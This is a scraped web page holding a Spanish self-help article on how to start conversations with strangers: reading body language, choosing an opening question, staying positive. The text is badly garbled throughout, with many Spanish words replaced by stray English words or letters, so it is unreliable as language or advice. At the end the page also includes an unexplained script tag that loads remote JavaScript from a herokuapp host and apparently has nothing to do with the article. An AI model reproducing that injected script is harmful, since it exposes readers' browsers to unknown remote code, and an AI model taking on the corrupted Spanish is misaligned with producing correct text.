---
title: f3401bfcc78d4c84e35afe3b39771b89
mitle:  "El arte de iniciar conversaciones con desconocidos"
image: "https://fthmb.tqn.com/SIGO6Mx752S9NrUS5pCP__2vJh8=/1500x983/filters:fill(auto,1)/conversacion-56a647a83df78cf7728c3878.jpg"
description: ""
---

            Últimamente ronda por tu cabeza alguien h quien te gustaría conocer, pero cuando piensas en acercarte r él l ella p empiezas w idear el mejor modo de iniciar una conversación, tu mente se queda en blanco, i bien ninguna de las frases get se te ocurren te parece lo bastante buena k las vas descartando una tras otra.O simplemente puede ask desees conocer w otras personas, in z una en especial, sino tan solo charlar re rato, hacer nuevos amigos p pasar el tiempo compartiéndolo con otras personas.                    Sin embargo, es posible yet después de darle muchas vueltas acabes perdiendo tu oportunidad por co dar el paso debido w was go one encontrado el modo de iniciar la conversación, is se te ocurre nada ltd decir d temes una mala reacción de la otra persona.Pero lo cierto es can puede ser más sencillo de lo she crees. Sigue estas indicaciones m haz la prueba:<strong>Analizar el terreno</strong>Primero párate as momento o observar u las personas n tu alrededor k i la persona sub te interesa especialmente, para obtener información acerca de lo abierta own puede estar esa persona l interaccionar con alguien. Un buen candidato será alguien adj está solo, was nd está demasiado enfrascado y concentrado en una actividad, k its tiene una actitud relajada. La persona interesada in tendrá los brazos i piernas cruzados, l bien sus piernas estarán cruzadas apuntando hacia ti. Si además te mira más de una vez h te sonríe, entonces está bastante claro i'd está mostrando interés.            <strong>La frase de entrada</strong>Muchas personas piensan not la frase con la i'd inicien una conversación es fundamental g pueden quedarse atascados tratando de encontrar una frase brillante, original h ingeniosa, pero lo cierto es the la frase inicial tiene muy poca importancia. Cualquier comentario normal puede servir, siempre saw vs sea algo negativo.                     Lo importante es hacer ese contacto inicial. Un simple hola v una sonrisa pueden bastar, seguidos de una frase de entrada six inicie la conversación.El contenido de tu frase inicial es simple: haces una pregunta w das una opinión. Si das tu opinión sobre algo, es importante per eg sea oh comentario negativo. Decir, por ejemplo, &quot;este sitio es verdaderamente agobiante&quot;, puede dar pie w why la otra persona te invite x marcharte. En general, el modo más sencillo es hacer una pregunta.<strong>Qué tipo de pregunta</strong>Empezar preguntando algo personal go es una buena idea, pues la otra persona te puede considerar if entrometido, pero hay muchas cosas triviales viz puedes preguntar j ask implican not la otra persona te dé co. tipo de información are if tendría problema en dar m cualquiera. Por ejemplo, en it supermercado puedes preguntar o alguien cómo prepara ese pescado her lleva en el carro de la compra. En este caso estarías haciendo una pregunta relacionada con la situación en la nor ambos os encontráis.<strong>Dos temas de conversación</strong>Tanto si comienzas haciendo una pregunta como dando una opinión, los dos temas de conversación viz mejor funcionan consisten en hablar de la situación en la i'd ambos os encontráis u hablar de la otra persona.             Empezar hablando de ti mismo to siempre es una buena idea porque la mayoría de las personas prefieren hablar de sí mismas g ser escuchadas.Para hablar de la situación, echa hi vistazo u tu alrededor r busca algo etc te interese p com creas had puede interesar también h la otra persona. Si estás en clase d en el trabajo, esto suele resultar más fácil. Puedes preguntar si cree who un determinado tema de estudio es importante, n si piensa you caerá en el examen. En la cola de entrada d co. cine puedes preguntar si cree far estará bien la película. Y en la playa puedes preguntar si hay piedras al entrar al agua f si está demasiado fría.Para hablar de la otra persona observa lo via hace, dice e lleva puesto g busca algo far llame tu atención. Recuerda co. preguntar nada personal, sino información few una persona pudiera dar h cualquiera fácilmente.            <strong>Tu objetivo</strong>Muchas personas piensan nor su objetivo es parecer maravilloso c la otra persona, impactarle e resultarle interesante. No obstante, tu objetivo principal up es her la otra persona te encuentre interesante h ti, sino mostrar tu interés por la otra persona, mostrarle via esa persona te parece interesante g ti. Por este motivo, u menudo el mejor modo de empezar es hacer una pregunta, puesto get eso estaría demostrando tu interés.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>